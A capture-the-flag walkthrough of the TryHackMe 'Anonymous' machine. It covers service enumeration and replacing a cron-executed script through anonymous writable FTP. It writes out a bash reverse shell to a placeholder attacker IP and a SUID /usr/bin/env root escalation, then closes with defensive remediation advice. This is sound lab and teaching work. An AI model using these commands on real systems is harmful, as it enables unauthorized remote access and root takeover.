# Try Hack Me - Anonymous

**Categories:** Security, Linux, Permissions  
**Difficulty:** Medium

All of the commands used in this guide use the exported variable $IP (`export IP=10.10.249.175`) in place of the target machine's IP address.

## 1: Enumeration - nmap, enum4linux

Having launched the machine, we perform a basic service enumeration scan with nmap :

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -oN nmap.out $IP
```
The scan shows 4 open ports : 21, 22, 139 and 445 :

```console
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|\_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:ATTACK-IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|\_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25 | ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
28 |_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

We can already see that the FTP service on 21 (vsFTPd 3.0.3) allows anonymous login. Having discovered SMB shares on 139 and 445, we also run enum4linux to provide more information on the available shares: 

```console
┌──(kali㉿kali)-[~]
└─$ enum4linux $IP | tee e4l.out
```

enum4linux discovers a share `pics` accessible without credentials and a user with username `namelessone`. This is useful info, but the share in question just contains pictures of "puppos" - SMB is not the way in this time.

## 2: FTP : anonymous connection

Returning to the FTP service, connecting with credentials anonymous:anonymous reveals a writable directory `scripts` that includes three files, `clean.sh` (which is both writeable and executable), `removed_files.log`, and `to_do.txt`:

```console
┌──(kali㉿kali)-[~]
└─$ ftp $IP
Connected to 10.10.249.175.
220 NamelessOne's FTP Server!
Name (10.10.249.175:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> ls scripts
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Sep 05 20:21 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Downloading the files with `mget *`, we can investigate the content of the `clean.sh` script :

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

The script is intended to replicate a temporary file clean up utility ; if we look at the `removed_files.log` file recovered from the FTP server, we can see that it contains entries written by the `clean.sh` script:

```console
┌──(kali㉿kali)-[~]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
```

This looks like a likely candidate for a cronjob - `clean.sh` is probably run at regular intervals to remove temporary files and log its activity. 

## 3. clean.sh exploit - poc, bash reverse shell

We now have the main elements of a potential exploit - it is likely that a cronjob is running code on the target from a writeable script, allowing us to replace the script's content and run arbitrary code. As a proof-of-concept, we make a simple bash script `clean.sh` that creates a new file `poc.txt` in the same `scripts` directory discovered on the server (we have the path to the directory in the original `clean.sh` script) :

```bash
#!/bin/bash

touch /var/ftp/scripts/poc.txt
```

We upload the file to replace the original `clean.sh` :

```console
┌──(kali㉿kali)-[~]
└─$ ftp $IP
Connected to 10.10.249.175.
220 NamelessOne's FTP Server!
Name (10.10.249.175:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put clean.sh scripts/clean.sh
local: clean.sh remote: scripts/clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
44 bytes sent in 0.00 secs (367.2543 kB/s)
```

We then wait a minute or so, and we see the `poc.txt` file in the directory :

```console
ftp> ls scripts
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000           44 Sep 05 20:38 clean.sh
-rw-rw-r--    1 1000     1000            0 Sep 05 20:39 poc.txt
-rw-rw-r--    1 1000     1000         1806 Sep 05 20:38 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

We can now repeat the exploit with a new `clean.sh` script containing a simple bash reverse shell (I'm hiding my IP here to protect my continued sloppiness on the VPN):

```bash 
#!/bin/bash

bash -i >& /dev/tcp/ATTACK_IP/4242 0>&1
```
We then upload the new `clean.sh` script, set up a netcat listener, and wait for the cronjob to run the script :

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [U_THOUGHT_ID_FORGET?] from (UNKNOWN) [10.10.249.175] 57440
bash: cannot set terminal process group (1590): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Go get the user flag at /home/namelessone/user.txt. If you're curious, you can also run `crontab -l` to see the cronjob we exploited for the foothold.

## 3: Privesc - lolbins, suid

We have already seen with the `id` command in the above snippet that `namelessone` is a member of the sudo group, but we don't have their credentials to run any sudo commands (if you run `sudo -l` the shell will complain that no tty is present - try `sudo -l -S` to try with a password from standard input).

At this stage, we can perform our basic privesc enumeration steps (you can also run an enumeration script to reach the same conclusions, but this machine does not require extensive enum for privesc) :
* user discovery : `cat /etc/passwd` shows no other non-system users
* process discovery  : `ps -aux` shows no obviously vulnerable services
* listening processes : `ss -tunlp` shows the same ports discovered by nmap, as well as an additional port 53 for DNS on 127.0.0.1
* cronjobs : `ls /etc/cron*` shows no unusual system level cronjobs
* SUID discovery : `find / -perm /4000 2>/dev/null` shows that `/usr/bin/env` has the SUID bit set

`/usr/bin/env` is used to configure terminal environments and can also be used to run other scripts or binaries (we commonly see it used to improve the portability of scripts with `#!/usr/bin/env python`, etc.). Presumably, any script or binary run by `/usr/bin/env` will retain the permissions associated with its SUID bit. To verify that this is a possible privesc vector, we should check that the `/usr/bin/env` binary is owned by root (or our target user - in this case, it is root) and is executable by the current user :

```console
namelessone@anonymous:~$ ls -la /usr/bin/env
ls -la /usr/bin/env
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env
```
Two for two. We can try then to open a terminal session using the `/usr/bin/env` binary (the `-p` flag on bash ensure that the session preserves the permissions inherited from the SUID bit):

```console
namelessone@anonymous:~$ /usr/bin/env bash -p
/usr/bin/env bash -p
whoami
root
```
The root flag is at /root/root.txt.

## 4. Summary, solutions

`namlessone` got done. So what went wrong here?

1. Anonymous read access to an FTP server provided enough information about the system to identify a potential exploit, and write access on the same server allowed us to test and perform the exploit 
2. The cronjob that provided the reverse shell was run by a normal user with extensive permissions (member of the sudo group, etc.) ; once this cronjob was exploited to provide a shell session, the session had all the same permissions.
3. The SUID bit on `/usr/bin/env` allowed us to run any binary with root permissions - effectively equivalent to a `namlessone ALL=(ALL) NOPASSWD:ALL` sudoers entry.

And what could have been done to prevent it?

1. Remove anonymous access to the FTP server (this was already on `namelessone`'s todo list - I guess they didn't get round to it in time). Read access results in information disclosure, and write access allows for hosting of malicious code, binaries, etc. that can be run once the system is accessed, or through social engineering attempts ("Hi, this is IT, did you run the update script yet? No problem if not, you just need to...")
2. Apply the principle of least privilege to helper scripts, cronjobs, etc. - why is the cronjob executing `clean.sh` running under the `namlessone` user account? Consider assigning these jobs to users with appropriately scoped permissions (similar to a www-data user) - this would have prevented the user.txt information disclosure.
3. Know what your system binaries do before scoping their permissions - an SUID bit on any root-owned binary that provides access to a shell provides a root shell. The SUID bit should be a last resort - what do users need the binary for? What do they need the elevated permissions for? Can these needs be met with minimum privileges by appropriately scoping user and group permissions to required binaries?
